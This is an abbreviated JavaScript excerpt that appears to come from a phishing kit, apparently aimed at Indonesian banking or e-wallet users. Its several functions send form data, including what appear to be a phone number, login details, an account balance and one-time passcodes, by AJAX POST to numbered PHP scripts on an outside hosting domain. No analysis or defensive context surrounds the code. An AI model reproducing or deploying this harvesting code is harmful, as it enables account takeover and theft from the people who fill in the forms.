function sendHp() {
   ...
   $.ajax({
      url: 'https://slategrey-elephant-264686.hostingersite.com/p/p/req/one.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://slategrey-elephant-264686.hostingersite.com/p/p/req/two.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url:  'https://slategrey-elephant-264686.hostingersite.com/p/p/req/thre.php',
      type: 'POST',
...
function sendOtpS() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://slategrey-elephant-264686.hostingersite.com/p/p/req/empat.php',
...
function sendBelum(){    
   ...
   $.ajax({
        type: 'POST',
        url: 'https://slategrey-elephant-264686.hostingersite.com/p/p/req/lima.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://slategrey-elephant-264686.hostingersite.com/p/p/req/tujuh.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
